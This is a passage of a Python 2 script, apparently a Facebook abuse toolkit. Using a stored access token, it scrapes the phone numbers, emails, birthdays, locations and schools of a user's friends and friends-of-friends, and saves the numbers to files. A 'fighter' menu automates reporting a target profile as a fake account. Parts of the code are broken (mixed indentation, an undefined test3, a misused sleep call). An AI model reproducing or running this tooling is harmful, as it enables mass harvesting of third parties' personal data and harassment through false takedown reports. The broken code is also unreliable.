            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;95m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;96m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Phone\x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] An error occurred '
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput Friends ID \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            noms = raw_input('\x1b[1;91m[+] \x1b[1;95mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal number\x1b[1;96m%s' % len(hpfromfriends)
            print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;95m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;95m[\xe2\x9c\x96] No connection'
            keluar()

def informasi():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[?] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 42*"\033[1;97m?"
			try:
				print '\033[1;91m[¡î] \033[1;92mName\033[1;95m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[¡î] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;92m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[¡î] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;96m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[¡î] \033[1;92mTelephone\033[1;95m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[¡î] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;93m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[¡î] \033[1;92mDate of birth\033[1;91m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[¡î] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;92m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			asif()
		else:
			pass
	else:
		print"\033[1;91m[?] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()

def fighter():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
        time.sleep(0.05)
	    print "\033[1;93m-???-\033[1;97m> \033[1;91m1.\x1b[1;92m«ã Target  Profile.  "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;97m> \033[1;91m2.\x1b[1;92m«ã Start   Reporting."
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;97m> \033[1;91m3.\x1b[1;92m«ã Start   Report1.  "
        time.sleep(0.05)
        print "\033[1;93m-???-\033[1;97m> \033[1;91m4.\x1b[1;92m«ã Start   Report2.  "
        time.sleep(0.05)
	print "\033[1;93m-???-\033[1;91m> \033[1;91m0.\033[1;91m«ã Back             "
	pilih_fighter()

def pilih_fighter():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_fighter()
	elif peak =="1":
		report()
        elif peak =="2":
	        rep()
        elif peak =="3":
                test1()
        elif peak =="4":
	        test2()
	elif peak =="0":
		menu()
def report():
    try:
        os.system('clear')
        id = raw_input(R+'[+]'+G+' Enter Target Id: '+W)
        my = ("https://m.facebook.com/"+id)
        url = my
        br.open(url)
        dray = raw_input(R+'[*] '+G+'Do You Want To Report \n'+R+'[+]'+G+' [y/n] :\n'+ G +' BlackMafia ' + R + ' «ã ' + W)
        return rep()    
    except:
        fighter()
def rep():
    x = open(ids,'r')
    y = x.read()
    if id in y:
        print (R+'.  Oops 405')
        time.sleep(1)
        time.sleep(R+'Error While Reporting the Id')
        time.sleep(1)
        return test1()
    else:         
        return test2()
               
def test1():
          _bs = br.response().read()
          bb=bs4.BeautifulSoup(_bs,
				features="html.parser"
			)
          if len(bb) !=0:              
              for x in bb.find_all("a",href=True):                  
                  if "rapid_report" in x["href"]:                      
                      _cadow = x["href"]                      
                      br.open(_cadow)
                      return test2()
          
def test2():
    try:
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["tag"] = ["profile_fake_account"]
        br.submit()
        return test3()
    except Exception as f:
        print (' Mr-Robot')
                
if __name__ == '__main__':
	login()
